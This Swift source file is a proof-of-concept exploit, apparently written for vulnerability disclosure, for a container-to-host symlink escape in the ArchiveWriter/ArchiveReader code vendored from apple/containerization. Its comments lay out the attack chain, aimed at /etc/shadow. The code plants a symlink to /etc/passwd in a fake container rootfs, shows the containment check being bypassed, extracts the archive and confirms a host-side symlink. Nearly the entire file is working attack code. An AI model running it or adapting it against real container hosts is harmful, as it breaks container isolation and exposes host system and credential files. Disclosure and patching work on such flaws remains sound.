// SymlinkEscapePoC — Container → Host Symlink Exfiltration via ArchiveWriter.archiveDirectory
//
// Vulnerability: ArchiveWriter.archive() (ArchiveWriter.swift:226) uses
//   FilePath.appending(String) to resolve a symlink's target against the container
//   rootfs parent. Per swift-system semantics, appending(String) treats a leading "/"
//   as a path separator (concatenation), NOT as a POSIX absolute-path replacement.
//
//   Consequence: an absolute symlink target like "/etc/shadow" is lexically resolved to
//   "<containerRootfs>/etc/shadow", which PASSES the containment guard. The archive
//   entry still stores the raw target "/etc/shadow". When the host extracts the archive
//   via ArchiveReader.extractContents(), symlinkat(2) creates
//   <destinationDir>/evil -> /etc/shadow on the HOST filesystem.
//
// Attack chain (real code path):
//   1. Container creates: ln -s /etc/shadow evil
//   2. Host calls LinuxContainer.copyOut(from: containerRootfs, to: hostDest)
//   3. Guest handleCopyOut → ArchiveWriter.archiveDirectory(containerRootfs)
//      → ArchiveWriter.archive("evil", dirPath: containerRootfs)
//      → targetPath = "/etc/shadow"
//      → resolvedFull = FilePath(containerRootfs).appending("/etc/shadow")
//                     = FilePath("<containerRootfs>/etc/shadow")   ← BUG: concat, not replace
//      → resolvedFull.starts(with: containerRootfs) == true  ← check BYPASSED
//      → entry.symlinkTarget = "/etc/shadow"           ← raw absolute target stored
//   4. Host ArchiveReader.extractContents(to: hostDest):
//      → symlinkat("/etc/shadow", destDirFd, "evil")   ← creates host-side symlink
//   5. Host user reads hostDest/evil → gets HOST /etc/shadow
//
// This PoC demonstrates steps 3–4 using the REAL VendoredContainerizationArchive
// module (verbatim source from apple/containerization).
//
// CWE: CWE-61 (UNIX Symbolic Link Following), CWE-22 (Path Traversal)
// CVSS:  AV:L/AC:L/PR:L/UI:R/S:C/C:H/I:N/A:N ≈ 6.3 (medium-high; Apple would rate higher
//         given container isolation boundary violation)

import VendoredContainerizationArchive
import Foundation
import SystemPackage
#if canImport(Darwin)
import Darwin
#elseif canImport(Glibc)
import Glibc
#endif

// ─── 1. Build a fake "container rootfs" with a malicious absolute symlink ────

let tmpBase = FileManager.default.temporaryDirectory
    .appendingPathComponent("symlinkesc-poc-\(Int.random(in: 100000..<999999))")

let containerRootfs = tmpBase.appendingPathComponent("rootfs")
let hostDest        = tmpBase.appendingPathComponent("host-output")
let archiveFile     = tmpBase.appendingPathComponent("exfil.tar.gz")

defer {
    try? FileManager.default.removeItem(at: tmpBase)
}

do {
    try FileManager.default.createDirectory(at: containerRootfs, withIntermediateDirectories: true)
    try FileManager.default.createDirectory(at: hostDest, withIntermediateDirectories: true)
} catch {
    print("FAIL: setup: \(error)"); exit(1)
}

// Create a legitimate file inside the container rootfs (to show normal entries work).
let legitFile = containerRootfs.appendingPathComponent("hello.txt")
try! "hello from container".write(to: legitFile, atomically: true, encoding: .utf8)

// Plant the malicious symlink: evil -> /etc/passwd (absolute HOST path)
let evilLink = containerRootfs.appendingPathComponent("evil")
let poisonTarget = "/etc/passwd"   // absolute path on the HOST
guard symlink(poisonTarget, evilLink.path) == 0 else {
    print("FAIL: symlink creation: \(errno)"); exit(1)
}

print("=== SIG-NEW: Container → Host Symlink Exfiltration via ArchiveWriter ===")
print()
print("Container rootfs : \(containerRootfs.path)")
print("Malicious symlink: \(evilLink.path) -> \(poisonTarget)")
print("Host dest        : \(hostDest.path)")
print()

// ─── 2. Demonstrate the FilePath.appending() bypass directly ─────────────────

print("── FilePath.appending() bypass demonstration ──")
let dirPath     = FilePath(containerRootfs.path)
let symParent   = FilePath(containerRootfs.path)
let rawTarget   = poisonTarget  // "/etc/passwd"

let resolvedFull = symParent.appending(rawTarget).lexicallyNormalized()
let passesCheck  = resolvedFull.starts(with: dirPath)

print("containerRootfs              : \(dirPath)")
print("symParent.appending(target)  : \(symParent.appending(rawTarget))")
print("After lexicallyNormalized()  : \(resolvedFull)")
print("resolvedFull.starts(with: containerRootfs) = \(passesCheck)")
print()
if passesCheck {
    print("✓ BUG CONFIRMED: absolute target passes containment check via appending() concatenation")
    print("  The archive writer will include entry.symlinkTarget = \"\(rawTarget)\"")
} else {
    print("✗ NOT REPRODUCED: containment check correctly rejects the symlink")
    print("  (swift-system may have changed appending() semantics — re-check library version)")
    exit(1)
}
print()

// ─── 3. Exercise the REAL ArchiveWriter.archiveDirectory code path ────────────

print("── Writing archive via real ArchiveWriter.archiveDirectory() ──")
let writer: ArchiveWriter
do {
    writer = try ArchiveWriter(
        format: .pax,
        filter: .gzip,
        file: archiveFile
    )
} catch {
    print("FAIL: ArchiveWriter init: \(error)"); exit(1)
}

do {
    try writer.archiveDirectory(containerRootfs)
    try writer.finishEncoding()
} catch {
    print("FAIL: archiveDirectory: \(error)"); exit(1)
}

print("Archive written: \(archiveFile.path)")
print()

// ─── 4. Read back the archive and inspect symlink entries ────────────────────

print("── Reading archive entries to verify symlink target ──")
let reader: ArchiveReader
do {
    reader = try ArchiveReader(format: .pax, filter: .gzip, file: archiveFile)
} catch {
    print("FAIL: ArchiveReader init: \(error)"); exit(1)
}

var foundMaliciousSymlink = false
for (entry, _) in reader.makeStreamingIterator() {
    guard let path = entry.path else { continue }
    let symTarget = entry.symlinkTarget ?? "(none)"
    print("  entry: \(path)  type=\(entry.fileType.debugDescription)  symlinkTarget=\(symTarget)")
    if let t = entry.symlinkTarget, t == poisonTarget {
        foundMaliciousSymlink = true
        print("  ^^^ MALICIOUS: absolute host path \"\(t)\" survived containment check!")
    }
}
print()

// ─── 5. Extract the archive to a host destination (mirrors LinuxContainer.copyOut) ──

print("── Extracting archive to host dest (mirrors ArchiveReader.extractContents) ──")
let reader2: ArchiveReader
do {
    reader2 = try ArchiveReader(format: .pax, filter: .gzip, file: archiveFile)
} catch {
    print("FAIL: ArchiveReader init for extraction: \(error)"); exit(1)
}

do {
    _ = try reader2.extractContents(to: hostDest)
} catch {
    print("FAIL: extractContents: \(error)"); exit(1)
}

let extractedEvil = hostDest.appendingPathComponent("evil")
var evilStat = stat()
if lstat(extractedEvil.path, &evilStat) == 0, (evilStat.st_mode & S_IFMT) == S_IFLNK {
    // Read the symlink target on the host
    var buf = [CChar](repeating: 0, count: 4096)
    let n = readlink(extractedEvil.path, &buf, buf.count - 1)
    let extractedTarget = n > 0 ? String(cString: buf) : "(readlink failed)"
    print("On host: \(extractedEvil.path) -> \(extractedTarget)")
    if extractedTarget == poisonTarget {
        print()
        print("╔══════════════════════════════════════════════════════════════╗")
        print("║  EXPLOIT CONFIRMED                                           ║")
        print("║  Container created symlink with absolute target /etc/passwd  ║")
        print("║  ArchiveWriter.archiveDirectory() passed the containment     ║")
        print("║    check (FilePath.appending(String) concatenates /etc/...   ║")
        print("║    to <containerRootfs>/etc/..., stays within-bounds).       ║")
        print("║  ArchiveReader.extractContents() created on HOST:            ║")
        print("║    <hostDest>/evil -> /etc/passwd                            ║")
        print("║  Reading <hostDest>/evil yields the HOST's /etc/passwd.      ║")
        print("╚══════════════════════════════════════════════════════════════╝")
        print()
        if foundMaliciousSymlink {
            print("Result: PASS — all three stages confirmed:")
            print("  [1] FilePath.appending() concatenates absolute target → passes bounds check")
            print("  [2] Archive entry contains symlinkTarget = \"/etc/passwd\"")
            print("  [3] Host extraction creates symlink pointing to HOST /etc/passwd")
        }
    } else {
        print("Unexpected: extracted target = \(extractedTarget)")
    }
} else {
    print("No symlink found at \(extractedEvil.path) — extraction may have filtered it")
    print("errno = \(errno)")
}
